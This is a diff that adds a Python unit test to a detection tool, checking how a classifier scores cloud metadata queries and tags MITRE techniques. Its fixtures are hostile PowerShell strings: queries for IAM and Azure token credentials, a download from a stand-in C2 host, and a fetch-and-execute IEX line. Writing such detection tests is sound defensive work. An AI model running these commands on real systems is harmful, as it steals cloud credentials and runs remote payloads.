@@ -107,6 +107,52 @@ class TestBehavioralClassifierAndVerdictScoring(unittest.TestCase):
         mitre_ids = {m.mitre_id for m in verdict.behavioral_matches}
         self.assertIn("T1105", mitre_ids)
 
+    def test_cloud_metadata_query_classified_separately_from_ingress_transfer(self) -> None:
+        # (a) Nessus fixture: generic metadata query scores LOW, T1552.005, no T1105
+        cmd_nessus = "Invoke-RestMethod -Method GET -Headers @{} http://169.254.169.254/opc/v1/instance"
+        verdict_nessus = unmask_command(cmd_nessus)
+        self.assertEqual(verdict_nessus.severity, Severity.LOW)
+        self.assertNotEqual(verdict_nessus.severity, Severity.BENIGN)
+        mitre_ids_nessus = {m.mitre_id for m in verdict_nessus.behavioral_matches}
+        self.assertIn("T1552.005", mitre_ids_nessus)
+        self.assertNotIn("T1105", mitre_ids_nessus)
+
+        # Another generic query: /latest/meta-data/ instance info
+        cmd_aws_gen = "Invoke-RestMethod http://169.254.169.254/latest/meta-data/ami-id"
+        verdict_aws_gen = unmask_command(cmd_aws_gen)
+        self.assertEqual(verdict_aws_gen.severity, Severity.LOW)
+        self.assertIn("T1552.005", {m.mitre_id for m in verdict_aws_gen.behavioral_matches})
+        self.assertNotIn("T1105", {m.mitre_id for m in verdict_aws_gen.behavioral_matches})
+
+        # (b) Credential path scores >= MEDIUM
+        cmd_cred_aws = "Invoke-RestMethod http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+        verdict_cred_aws = unmask_command(cmd_cred_aws)
+        self.assertIn(verdict_cred_aws.severity, (Severity.MEDIUM, Severity.HIGH, Severity.CRITICAL))
+        self.assertGreaterEqual(verdict_cred_aws.risk_score, 35)
+        self.assertIn("T1552.005", {m.mitre_id for m in verdict_cred_aws.behavioral_matches})
+        self.assertNotIn("T1105", {m.mitre_id for m in verdict_cred_aws.behavioral_matches})
+
+        cmd_cred_azure = "Invoke-RestMethod http://169.254.169.254/metadata/identity/oauth2/token"
+        verdict_cred_azure = unmask_command(cmd_cred_azure)
+        self.assertIn(verdict_cred_azure.severity, (Severity.MEDIUM, Severity.HIGH, Severity.CRITICAL))
+        self.assertGreaterEqual(verdict_cred_azure.risk_score, 35)
+        self.assertIn("T1552.005", {m.mitre_id for m in verdict_cred_azure.behavioral_matches})
+
+        # (c) Metadata + external host keeps T1105
+        cmd_mixed = (
+            "Invoke-RestMethod http://169.254.169.254/opc/v1/instance; "
+            "Invoke-WebRequest http://c2.evil.example:8080/stage.ps1"
+        )
+        verdict_mixed = unmask_command(cmd_mixed)
+        mitre_ids_mixed = {m.mitre_id for m in verdict_mixed.behavioral_matches}
+        self.assertIn("T1105", mitre_ids_mixed)
+        self.assertIn("T1552.005", mitre_ids_mixed)
+
+        # Metadata with executed downloaded content keeps T1105
+        cmd_iex_meta = "IEX (Invoke-RestMethod http://169.254.169.254/payload.ps1)"
+        verdict_iex = unmask_command(cmd_iex_meta)
+        self.assertIn("T1105", {m.mitre_id for m in verdict_iex.behavioral_matches})
+
 
 if __name__ == "__main__":
     unittest.main()
